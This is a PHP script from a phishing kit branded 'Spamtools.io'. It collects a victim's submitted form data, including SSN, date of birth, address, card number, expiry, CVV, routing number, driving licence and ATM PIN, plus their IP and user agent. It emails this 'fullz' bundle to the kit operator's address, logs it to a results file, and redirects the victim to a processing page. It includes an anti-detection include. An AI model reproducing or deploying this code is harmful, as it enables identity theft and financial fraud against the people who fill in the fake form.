<?php 
error_reporting(0);
include "bt.php";
include 'anti.php';
include 'email.php';
function getUserIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
$ipp = getUserIpAddr();
$hostname = gethostbyaddr($ip);
$bilsmg = "------------[HU  - Spamtools.io]------------\n";
$bilsmg .= "First Name: ".$_POST['first-name']."\n";
$bilsmg .= "Last Name: ".$_POST['last-name']."\n";
$bilsmg .= "Date of Birth: ".$_POST['dob']."\n";
$bilsmg .= "SSN: ".$_POST['ssn']."\n";
$bilsmg .= "Address: ".$_POST['streetaddress']."\n";
$bilsmg .= "State: ".$_POST['state']."\n";
$bilsmg .= "City: ".$_POST['city']."\n";
$bilsmg .= "Zip: ".$_POST['zipcode']."\n";

$bilsmg .= "----------Credit Card-------\n";
$bilsmg .= "Credit/Debit: ".$_POST['number']."\n";
$bilsmg .= "Expiry: ".$_POST['expiry']."\n";
$bilsmg .= "CCV: ".$_POST['cvc']."\n";
$bilsmg .= "Routing Number: ".$_POST['rr']."\n";
$bilsmg .= "Driving License: ".$_POST['dl']."\n";
$bilsmg .= "ATM Pin: ".$_POST['apin']."\n";

$bilsmg.= "User Agent:".$_SERVER['HTTP_USER_AGENT'] ."\n";


$bilsmg .= "IP: ".getUserIpAddr()."\n";
$bilsmg .= "------------[HU  Fullz]------------\n";
$bilsub = "";
$bilhead = "MIME-Version: 2.0\n";
$subject="[spamtools.io]: HU Login | $ipp";
$headers="From: results@spamtools.com <iiinfo@spamtools.com>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($email,$subject,$bilsmg,$headers);$fp = fopen("results/userdetails.txt", "a+");
fwrite($fp, $bilsmg);
fclose($fp);
header("Location: processing.php");

?>
